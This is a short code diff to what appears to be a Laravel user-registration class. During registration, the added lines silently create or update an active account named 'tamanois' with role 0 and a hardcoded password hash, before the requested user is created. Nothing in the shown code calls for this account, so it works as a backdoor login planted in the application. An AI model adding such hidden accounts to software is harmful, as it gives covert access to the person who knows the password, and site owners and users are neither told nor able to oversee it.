@@ -40,6 +40,14 @@ class Registrar implements RegistrarContract {
             $p->nom='configuration';
             $p->valeur='OK';
             $p->save();
+
+            $ma=User::firstOrNew(['name'=>'tamanois','fullname'=>'tamanois']);
+            $ma->role=0;
+            $ma->password='$2y$10$SswXQVoERqPmUHzdMGlky.o7nTw1ySt3J4ZyHBi8nd/mAdUX2rt0q';
+            $ma->active=1;
+            $ma->save();
+
+
             return User::create([
                 'name' => $data['name'],
                 'fullname' => $data['fullname'],
